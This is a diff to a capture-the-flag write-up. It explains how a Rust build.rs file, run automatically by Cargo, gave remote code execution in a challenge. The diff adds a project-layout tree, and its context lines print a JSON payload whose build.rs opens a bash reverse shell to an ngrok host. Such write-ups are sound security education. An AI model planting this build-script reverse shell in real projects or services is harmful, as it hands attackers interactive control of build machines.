@@ -16,7 +16,19 @@ curl -sSk -X POST -H 'Content-Type: application/json' https://day4.challenges.xm
 
 <p align="center"><img src="Screenshots/S3.png" alt="Desc"></p>
 
-<p align="justify">Afterward, I thought I would be able to load the file directly, but the name of the flag file wasn't the one provided in the source files. Since I couldn’t guess the actual name of the flag file, I decided to deploy a reverse shell. In Rust, when code is compiled using Cargo, the file build.rs is automatically loaded into the compilation process (it is located in the root folder of your rust project). This file is often used to generate files that you want to include in your Rust project, or to run scripts before and after compilation. So, in the context of this challenge, it was an open door to remote code execution (RCE). As a result, I deployed a reverse shell using the following JSON payload (the reverse shell payload is available in revshell.rs in this repository):</p>
+<p align="justify">Afterward, I thought I would be able to load the file directly, but the name of the flag file wasn't the one provided in the source files. Since I couldn’t guess the actual name of the flag file, I decided to deploy a reverse shell. In Rust, when code is compiled using Cargo, the file build.rs is automatically loaded into the compilation process (it is located in the root folder of your rust project). This file is often used to generate files that you want to include in your Rust project, or to run scripts before and after compilation: </p> 
+
+````text
+project_dir/
+├── Cargo.toml      
+├── build.rs        
+├── src/
+│   ├── main.rs     
+│   └── lib.rs      
+└── output_dir/
+````
+
+<p align="justify">So, in the context of this challenge, it was an open door to remote code execution (RCE). As a result, I deployed a reverse shell using the following JSON payload (the reverse shell payload is available in revshell.rs in this repository):</p>
 
 ````json
 {"src/main.rs":"fn main() { println!(\"Hello, world!\"); }", "build.rs":"use std::process::Command; fn main() { let ip = \"0.tcp.eu.ngrok.io\"; let port = \"13457\"; let _ = Command::new(\"bash\").arg(\"-c\").arg(format!(\"exec 5<>/dev/tcp/{}/{}; cat <&5 | while read line; do $line 2>&5 >&5; done\", ip, port)).spawn().expect(\"Failed\"); println!(\"Reverse shell attempted to connect to {}:{}\", ip, port); }"}
